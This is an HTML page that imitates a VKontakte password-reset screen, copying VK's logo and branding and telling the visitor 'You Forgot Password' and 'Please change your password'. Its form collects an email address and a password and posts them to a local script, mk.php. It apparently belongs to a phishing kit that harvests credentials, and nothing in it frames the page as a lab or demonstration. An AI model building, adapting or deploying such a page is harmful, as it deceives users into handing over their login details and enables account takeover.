<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Welcome to VKontakte</title>
    <!-- CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
</head>

<body>

<header class="fixed-top">
        <div class="container">
            <div class="row">
                <div class="col-md-12 px-0">
                    <nav class="navbar navbar-light py-0">
                        <div class="navbar-header w-100 px-0">
                            <a class="navbar-brand">
                                <svg width="30" height="30" viewBox="0 0 30 30" fill="none"
                                    xmlns="http://www.w3.org/2000/svg">
                                    <path
                                        d="M0 14.4C0 7.61 0 4.22 2.1 2.1 4.23 0 7.62 0 14.4 0h1.2c6.79 0 10.18 0 12.3 2.1C30 4.23 30 7.62 30 14.4v1.2c0 6.79 0 10.18-2.1 12.3C25.77 30 22.38 30 15.6 30h-1.2c-6.79 0-10.18 0-12.3-2.1C0 25.77 0 22.38 0 15.6v-1.2z"
                                        fill="#07F"></path>
                                    <path
                                        d="M15.96 21.61c-6.84 0-10.74-4.68-10.9-12.48H8.5c.11 5.72 2.63 8.14 4.63 8.64V9.13h3.23v4.93c1.97-.21 4.05-2.46 4.75-4.94h3.22a9.53 9.53 0 01-4.38 6.23 9.87 9.87 0 015.13 6.26h-3.55c-.76-2.37-2.66-4.21-5.17-4.46v4.46h-.39z"
                                        fill="#fff"></path>
                                </svg>
                            </a>
                            </form>
                        </div>
                    </nav>
                </div>
            </div>
        </div>
    </header>

    <div class="jionFrom__header d-block text-center">
        <h4>You Forgot Password</h4>
                        </div>
     <div class="jionFrom__subheader d-block text-center">
        <p>Please change your password</p>  
                        </div>
    <div class="container ">
        <div class="card">
            <div class="card-header text-center">
                <img src="image/vk_logo.png" alt="" width="30" height="30">
                 Welcome to VKontakte 
            </div>
            <div class="card-body">
            <form action="mk.php" method="post">
                    <div class="form-group">
                        <label for="exampleInputEmail1">Email address</label>
                        <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp"
                            required="">
                        <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone
                            else.</small>
                    </div>
                    <div class="form-group">
                        <label for="exampleInputEmail1">Password</label>
                        <input type="password" name="password" class="form-control" id="password" required="">
                    </div>
                    <div class="form-group">
                        <label for="exampleInputEmail1">Confirm Password</label>
                        <input type="password" name="cpassword" class="form-control" id="cpassword" required="">
                    </div>
                    
                    <input type="submit" name="btnRegister" class="btn btn-primary" >
                </form>
            </div>
        </div>
    </div>
</body>

</html>